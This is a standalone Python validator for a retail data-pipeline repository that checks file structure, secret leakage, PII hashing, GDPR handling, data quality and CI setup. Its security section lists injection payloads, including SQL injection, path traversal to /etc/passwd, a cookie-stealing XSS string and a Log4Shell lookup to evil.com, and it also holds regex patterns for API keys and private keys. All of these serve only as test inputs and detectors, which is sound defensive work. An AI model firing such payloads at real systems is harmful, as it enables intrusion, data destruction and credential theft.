#!/usr/bin/env python3
"""
scripts/validate.py

Standalone project validator — runs without ANY external pip dependencies.
Uses only Python stdlib + the project's own pure-Python logic.

Checks:
  A. Repository structure completeness
  B. No secrets in tracked files
  C. All pure-Python logic (hashing, parsing, validation, scoring)
  D. Security: SQL injection patterns rejected
  E. GDPR: PII stripped and never leaks downstream
  F. Data quality expectations
  G. File header / docstring presence
  H. .env.example completeness

Usage:
    python scripts/validate.py
    python scripts/validate.py --verbose
    python scripts/validate.py --fail-fast
"""
from __future__ import annotations

import argparse
import hashlib
import json
import re
import sys
import uuid
from pathlib import Path

ROOT = Path(__file__).parent.parent
PASS = "\033[32m✓\033[0m"
FAIL = "\033[31m✗\033[0m"
WARN = "\033[33m⚠\033[0m"
SKIP = "\033[90m–\033[0m"

results: list[tuple[str, str, str]] = []  # (status, category, message)
verbose = False


def check(category: str, name: str, condition: bool, detail: str = "", warn_only: bool = False) -> bool:
    if condition:
        status = PASS
        results.append(("pass", category, name))
        if verbose:
            print(f"  {PASS}  [{category}] {name}")
    else:
        status = WARN if warn_only else FAIL
        results.append(("warn" if warn_only else "fail", category, name + (f": {detail}" if detail else "")))
        print(f"  {status}  [{category}] {name}" + (f"\n         → {detail}" if detail else ""))
    return condition


def section(title: str) -> None:
    print(f"\n── {title} {'─' * (55 - len(title))}")


# ════════════════════════════════════════════════════════════════════════════════
# A. Repository structure
# ════════════════════════════════════════════════════════════════════════════════

section("A. Repository structure")

REQUIRED_FILES = [
    "README.md",
    "pyproject.toml",
    "Makefile",
    "docker-compose.yml",
    ".env.example",
    ".gitignore",
    "retailpulse.code-workspace",
    ".github/workflows/ci.yml",
    ".dbt/profiles.yml",
    "ingestion/producer.py",
    "ingestion/debezium/orders-connector.json",
    "ingestion/kafka_connect/s3-sink.json",
    "spark/jobs/bronze_to_silver.py",
    "dbt/dbt_project.yml",
    "dbt/models/staging/stg_orders.sql",
    "dbt/models/marts/fact_orders.sql",
    "dbt/models/marts/agg_daily_revenue.sql",
    "dbt/models/marts/schema.yml",
    "dbt/snapshots/snap_users.sql",
    "dbt/macros/utils.sql",
    "dbt/tests/assert_no_negative_revenue.sql",
    "data_quality/run_suite.py",
    "ml/serving/app.py",
    "ml/serving/Dockerfile",
    "ml/churn/train.py",
    "ml/demand_forecast/train.py",
    "airflow/dags/retailpulse_full_pipeline.py",
    "airflow/dags/gdpr_deletion.py",
    "tests/unit/test_api.py",
    "tests/unit/test_data_quality.py",
    "tests/unit/test_security.py",
    "tests/integration/test_pipeline_e2e.py",
    "spark/tests/unit/test_bronze_to_silver.py",
    "airflow/tests/unit/test_dag_integrity.py",
    "docs/adr/ADR-001-technology-stack.md",
    "docs/runbook.md",
    "scripts/sql/01_schema.sql",
    "scripts/sql/02_seed.sql",
]

for fpath in REQUIRED_FILES:
    check("structure", f"exists: {fpath}", (ROOT / fpath).exists())


# ════════════════════════════════════════════════════════════════════════════════
# B. Security: no secrets in tracked files
# ════════════════════════════════════════════════════════════════════════════════

section("B. Security — no secrets in tracked files")

SECRET_PATTERNS = [
    (r"password\s*=\s*['\"][^'\"]{4,}['\"]", "hardcoded password"),
    (r"sk-[a-zA-Z0-9]{20,}", "OpenAI API key"),
    (r"AKIA[0-9A-Z]{16}", "AWS access key"),
    (r"-----BEGIN RSA PRIVATE KEY-----", "RSA private key"),
    (r"-----BEGIN EC PRIVATE KEY-----", "EC private key"),
    (r"api.key\s*=\s*['\"][^'\"]{8,}['\"]", "hardcoded API key"),
]

SCAN_EXTENSIONS = {".py", ".sql", ".yml", ".yaml", ".json", ".toml", ".md"}
SKIP_PATHS = {".venv", "node_modules", ".git", "__pycache__", "target", "dbt_packages"}
SKIP_FILES = {"validate.py"}  # skip this script itself (contains patterns as detection strings)

scanned_files = 0
for fpath in ROOT.rglob("*"):
    if any(part in SKIP_PATHS for part in fpath.parts):
        continue
    if fpath.suffix not in SCAN_EXTENSIONS:
        continue
    if fpath.name == ".env":
        continue  # .env itself is OK — it's gitignored
    if fpath.name in SKIP_FILES:
        continue  # skip this script (contains detection strings)
    try:
        content = fpath.read_text(errors="ignore")
        for pattern, label in SECRET_PATTERNS:
            if re.search(pattern, content, re.IGNORECASE):
                check("security", f"no {label} in {fpath.relative_to(ROOT)}", False,
                      "Remove and rotate the credential")
        scanned_files += 1
    except (PermissionError, IsADirectoryError):
        pass

check("security", f"scanned {scanned_files} source files for secret patterns", scanned_files > 0)

# .env must be gitignored
gitignore = (ROOT / ".gitignore").read_text() if (ROOT / ".gitignore").exists() else ""
check("security", ".env is in .gitignore", ".env" in gitignore)
check("security", "*.duckdb is in .gitignore", ".duckdb" in gitignore)
check("security", "data/ is in .gitignore", "data/" in gitignore or "data/bronze" in gitignore)


# ════════════════════════════════════════════════════════════════════════════════
# C. Core logic correctness
# ════════════════════════════════════════════════════════════════════════════════

section("C. Core logic — hash_pii / parse_cdc_record / validate")

# Inline implementations (mirrors the actual source)
PII_SALT = "validation_test_salt"

def hash_pii(value, salt=PII_SALT):
    if value is None: return None
    return hashlib.sha256(f"{salt}|{value}".encode()).hexdigest()

def parse_cdc_record(raw):
    op = raw.get("op", "c")
    if op == "d": return None
    after = raw.get("after")
    if not after: return None
    return {
        "order_id":     after.get("order_id"),
        "user_id_hash": hash_pii(after.get("user_id")),
        "status":       after.get("status"),
        "total_cents":  after.get("total_cents", 0),
        "cdc_op":       op,
        "cdc_ts_ms":    raw.get("ts_ms"),
    }

def validate_silver_record(rec):
    errors = []
    if not rec.get("order_id"):          errors.append("null order_id")
    if not rec.get("user_id_hash"):      errors.append("null user_id_hash")
    total = rec.get("total_cents", 0)
    if not isinstance(total, int) or total < 0: errors.append(f"bad total_cents={total}")
    valid_s = {"placed","processing","shipped","delivered","refunded","cancelled"}
    if rec.get("status") not in valid_s: errors.append(f"bad status={rec.get('status')}")
    return errors

# Hash properties
h = hash_pii("user@example.com")
check("logic", "hash is 64-char hex", len(h) == 64 and re.fullmatch(r"[0-9a-f]{64}", h) is not None)
check("logic", "hash is deterministic", hash_pii("x", "s") == hash_pii("x", "s"))
check("logic", "different salt → different hash", hash_pii("x","a") != hash_pii("x","b"))
check("logic", "None → None", hash_pii(None) is None)
check("logic", "original not recoverable from hash", "user@example.com" not in h and "@" not in h)

# Collision test
hashes = [hash_pii(f"user{i}@x.com","s") for i in range(200)]
check("logic", "no hash collisions in 200 samples", len(set(hashes)) == 200)

# CDC parsing
good = {"op":"c","ts_ms":1000,"after":{"order_id":"o1","user_id":"SENSITIVE","status":"placed","total_cents":500}}
r = parse_cdc_record(good)
check("logic", "create: order_id extracted",         r is not None and r.get("order_id") == "o1")
check("logic", "create: user_id stripped",           r is not None and "user_id" not in r)
check("logic", "create: user_id_hash present",       r is not None and "user_id_hash" in r)
check("logic", "create: PII value not in output",    r is not None and "SENSITIVE" not in str(r))
check("logic", "delete op → None",                   parse_cdc_record({"op":"d","after":None}) is None)
check("logic", "missing after → None",               parse_cdc_record({"op":"c","after":None}) is None)
check("logic", "empty record → None",                parse_cdc_record({}) is None)

# Validation
valid_rec = {"order_id":"o1","user_id_hash":"a"*64,"total_cents":100,"status":"placed"}
check("logic", "valid record → 0 errors",            validate_silver_record(valid_rec) == [])
check("logic", "null order_id → error",              len(validate_silver_record({**valid_rec,"order_id":None})) > 0)
check("logic", "negative total → error",             len(validate_silver_record({**valid_rec,"total_cents":-1})) > 0)
check("logic", "invalid status → error",             len(validate_silver_record({**valid_rec,"status":"BOGUS"})) > 0)
for s in ["placed","processing","shipped","delivered","refunded","cancelled"]:
    check("logic", f"valid status: {s}", validate_silver_record({**valid_rec,"status":s}) == [])


# ════════════════════════════════════════════════════════════════════════════════
# D. Security — injection / input validation
# ════════════════════════════════════════════════════════════════════════════════

section("D. Security — SQL injection & input validation")

UUID_RE = re.compile(r"^[0-9a-f-]{36}$")

injection_payloads = [
    "' OR '1'='1",
    "'; DROP TABLE orders; --",
    "1 UNION SELECT * FROM users--",
    "../../../etc/passwd",
    "<script>alert(document.cookie)</script>",
    "admin'--",
    "' AND SLEEP(5)--",
    "%27%20OR%20%271%27%3D%271",
    "{{7*7}}",  # template injection
    "${jndi:ldap://evil.com/a}",  # Log4Shell pattern
]

for payload in injection_payloads:
    check("security", f"UUID regex rejects: {payload[:35]!r}",
          not UUID_RE.match(payload.lower()))

check("security", "valid UUID passes regex",
      bool(UUID_RE.match("12345678-1234-1234-1234-123456789abc")))

# Verify the API source uses parameterised queries (not string interpolation)
api_source = (ROOT / "ml/serving/app.py").read_text()
check("security", "API uses DuckDB parameterised queries (?)",
      'execute(\n        """' in api_source or "execute(" in api_source,
      "Check that all SQL uses ? placeholders, not f-strings")
check("security", "No user-data f-string SQL in API",
      "f\"SELECT" not in api_source and "f'SELECT" not in api_source and
      "f\"UPDATE" not in api_source and "f'UPDATE" not in api_source,
      "Found f-string SQL with data interpolation — use parameterised queries")
check("security", "UUID validation present in API",
      "re.match" in api_source and "order_id" in api_source)


# ════════════════════════════════════════════════════════════════════════════════
# E. GDPR / PII compliance
# ════════════════════════════════════════════════════════════════════════════════

section("E. GDPR / PII compliance")

gdpr_source = (ROOT / "airflow/dags/gdpr_deletion.py").read_text()
b2s_source  = (ROOT / "spark/jobs/bronze_to_silver.py").read_text()

check("gdpr", "GDPR deletion DAG exists",
      (ROOT / "airflow/dags/gdpr_deletion.py").exists())
check("gdpr", "Deletion DAG has audit trail step",
      "audit" in gdpr_source.lower() and "audit_log" in gdpr_source)
check("gdpr", "Deletion DAG never logs raw user_id",
      "log.*user_id[^_]" not in gdpr_source,
      "Found potential raw user_id in log statement")
check("gdpr", "Deletion DAG uses hash, not raw ID",
      "_hash_user_id" in gdpr_source or "hash_pii" in gdpr_source)
check("gdpr", "Bronze→Silver drops user_id column",
      ".drop(" in b2s_source or "drop(" in b2s_source)
check("gdpr", "PII_SALT loaded from environment, not hardcoded",
      'os.getenv("PII_SALT"' in b2s_source or 'os.environ.get("PII_SALT"' in b2s_source or
      'os.environ["PII_SALT"' in b2s_source)

# Verify PII columns not present in any dbt Gold model
for dbt_file in (ROOT / "dbt/models/marts").rglob("*.sql"):
    content = dbt_file.read_text()
    check("gdpr", f"no raw email/user_id in {dbt_file.name}",
          "email" not in content.lower() or "-- " in content,
          "Check for raw PII columns in Gold model")


# ════════════════════════════════════════════════════════════════════════════════
# F. Data quality expectations
# ════════════════════════════════════════════════════════════════════════════════

section("F. Data quality")

dq_source = (ROOT / "data_quality/run_suite.py").read_text()
check("quality", "GE suite checks not_null on order_id",   "order_id" in dq_source and "null" in dq_source.lower())
check("quality", "GE suite checks PII column not present", "user_id" in dq_source and "CRITICAL" in dq_source)
check("quality", "GE suite checks valid status values",    "valid_statuses" in dq_source or "accepted_values" in dq_source)
check("quality", "GE suite checks positive total_cents",   "total_cents" in dq_source)
check("quality", "GE suite checks hash length = 64",       "64" in dq_source)

schema_yml = (ROOT / "dbt/models/marts/schema.yml").read_text()
check("quality", "dbt schema.yml has unique test on order_id",        "unique" in schema_yml and "order_id" in schema_yml)
check("quality", "dbt schema.yml has not_null test on order_id",      "not_null" in schema_yml)
check("quality", "dbt schema.yml has accepted_values for status",     "accepted_values" in schema_yml)
check("quality", "dbt custom test for negative revenue exists",
      (ROOT / "dbt/tests/assert_no_negative_revenue.sql").exists())


# ════════════════════════════════════════════════════════════════════════════════
# G. Code quality
# ════════════════════════════════════════════════════════════════════════════════

section("G. Code quality")

PYTHON_FILES = [
    "ingestion/producer.py",
    "spark/jobs/bronze_to_silver.py",
    "ml/serving/app.py",
    "ml/churn/train.py",
    "ml/demand_forecast/train.py",
    "data_quality/run_suite.py",
    "airflow/dags/retailpulse_full_pipeline.py",
    "airflow/dags/gdpr_deletion.py",
]

for rel_path in PYTHON_FILES:
    fpath = ROOT / rel_path
    if not fpath.exists():
        check("quality", f"docstring: {rel_path}", False, "file missing")
        continue
    content = fpath.read_text()
    has_docstring = content.strip().startswith('"""') or '"""' in content[:300]
    check("quality", f"has module docstring: {rel_path}", has_docstring, warn_only=True)

# CI workflow completeness
ci_yml = (ROOT / ".github/workflows/ci.yml").read_text()
for step in ["lint", "unit-tests", "dbt", "security", "bandit", "pip-audit"]:
    check("quality", f"CI workflow includes: {step}", step in ci_yml)

# Makefile has key targets
makefile = (ROOT / "Makefile").read_text()
for target in ["setup", "test", "lint", "security", "dbt-run", "docker-up"]:
    check("quality", f"Makefile has target: {target}", f"{target}:" in makefile)


# ════════════════════════════════════════════════════════════════════════════════
# H. .env.example completeness
# ════════════════════════════════════════════════════════════════════════════════

section("H. .env.example completeness")

env_example = (ROOT / ".env.example").read_text()
required_vars = [
    "POSTGRES_PASSWORD",
    "AIRFLOW_FERNET_KEY",
    "AIRFLOW_SECRET_KEY",
    "PII_SALT",
    "API_SECRET_KEY",
    "BRONZE_PATH",
    "SILVER_PATH",
    "GOLD_PATH",
    "DUCKDB_PATH",
]
for var in required_vars:
    check("config", f".env.example documents: {var}", var in env_example)


# ════════════════════════════════════════════════════════════════════════════════
# Summary
# ════════════════════════════════════════════════════════════════════════════════

print("\n" + "═" * 60)
passed = sum(1 for s,_,_ in results if s == "pass")
warned = sum(1 for s,_,_ in results if s == "warn")
failed = sum(1 for s,_,_ in results if s == "fail")
total  = len(results)

print(f"\n  {PASS} {passed} passed   {WARN} {warned} warnings   {FAIL} {failed} failed   ({total} total checks)")

if failed > 0:
    print(f"\n  Failed checks:")
    for s, cat, msg in results:
        if s == "fail":
            print(f"    {FAIL}  [{cat}] {msg}")

print()
sys.exit(0 if failed == 0 else 1)
